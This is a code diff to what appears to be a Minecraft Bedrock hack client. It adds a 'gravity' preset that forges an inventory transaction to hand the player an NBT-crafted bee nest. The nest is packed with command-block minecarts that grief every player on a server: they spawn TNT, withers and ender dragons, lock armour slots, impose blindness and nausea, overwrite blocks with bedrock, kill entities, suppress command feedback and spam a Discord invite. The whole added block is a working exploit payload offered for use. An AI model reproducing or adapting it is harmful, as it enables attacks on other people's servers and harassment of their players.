@@ -5,7 +5,7 @@
 #include "../../../SDK/Tag.h"
 #include "../../Module/ModuleManager.h"
 
-CBEPCommand::CBEPCommand() : IMCCommand("cbep", "Gives you cbe presets", "<gmc/gms/gma> <write> <kick/kill/tp> <day/night> <admin> <nuke/realmkill>") {
+CBEPCommand::CBEPCommand() : IMCCommand("cbep", "Gives you cbe presets", "<gmc/gms/gma> <write> <kick/kill/tp> <day/night> <admin> <nuke/realmkill/gravity>") {
 	registerAlias("cp");
 }
 
@@ -174,25 +174,15 @@ bool CBEPCommand::execute(std::vector<std::string>* args) {
 			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
 		return true;
 	}
-	//save
-	//if (args->at(1) == "save") {
-		//std::stringstream build;
-	///	C_ItemStack* item = g_Data.getLocalPlayer()->getSelectedItem();
-		//if (args->at(1) == "save" && item != nullptr) {
-		//	if (item != nullptr && item->tag != nullptr) {
-		//		item->tag->write(build);
-		//	} else {
-			//	clientMessageF("%sCouldn't find NBT tags!", RED);
-			//	return true;
-			//}
-		//}
-	//	auto builtStr = build.str();
-	//	if (args->at(1) == "save") {
-		//	Utils::setClipboardText("{Count:1b,Damage:15s,Name:\"minecraft:Shulker_box\",tag:" + builtStr + "}");
-		//} else {
-		//	Utils::setClipboardText(builtStr);
-	//	}
-	//	clientMessageF("%s%s", GREEN, "CompoundTag copied:");
-	//	clientMessageF(builtStr.c_str());
-//	}
+	if (args->at(1) == "gravity") {
+		std::string tag = R"({Count:64b,Damage:1s,Name:"minecraft:bee_nest",CanPlaceOn:["grass","stone","deny","bedrock"],tag:{Occupants:[{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a title Gravity On Tio",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/say Join team gravity discord.gg/sy5gWvhNKY ",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/title @a actionbar discord.gg/sy5gWvhNKY ",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/tellraw @a {"rawtext":[{"text":"Gravity On Top"}]}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon tnt",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule commandblockoutput false",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamerule sendcommandfeedback false",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[tag=!safe] ~ ~ ~ summon wither ~ ~ ~ minecraft:entity_spawned §o§d§l§kiii§r§o§d§ldiscord.gg/sy5gWvhNKY §kiii§r",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.head 0 carved_pumpkin 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.chest 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.legs 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/replaceitem entity @a slot.armor.feet 0 glass 1 0 {"minecraft:item_lock":{ "mode":"lock_in_slot" }, "minecraft:keep_on_death":{}}",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/playanimation @e animation.cat.baby_transform d 999",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @e ~~~ fill ~5~5~5 ~-5~-5~-5 bedrock 0 replace command_block",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/kill @e[rm=15]",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/gamemode c @p",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/effect @a[rm=5] nausea 9999999 255 true",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"effect @a blindness 255 255",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},{ActorIdentifier:"minecraft:command_block_minecart<>",SaveData:{Command:"/execute @a[rm=5] ~ ~ ~ summon ender_dragon",Ticking:1b,TicksLeftToStay:1}},]}})";
+		yot->fromTag(*Mojangson::parseTag(tag));
+		g_Data.getLocalPlayer()->getTransactionManager()->addInventoryAction(C_InventoryAction(0, nullptr, nullptr, yot, nullptr, 1, 507, 99999));
+		g_Data.getLocalPlayer()->getSupplies()->inventory->addItemToFirstEmptySlot(yot);
+		if (Surge->surge)
+			clientMessageF("%sDADDY%s%s%s[%sSurge%s] %sHere is your CBEP!%s%sDADDY", OBFUSCATED, RESET, ITALIC, BOLD, BLUE, WHITE, BLUE, RESET, OBFUSCATED);
+		else
+			clientMessageF("[%sNG%s] %sHere is your CBEP!", LIGHT_PURPLE, WHITE, LIGHT_PURPLE);
+		return true;
+	}
 }
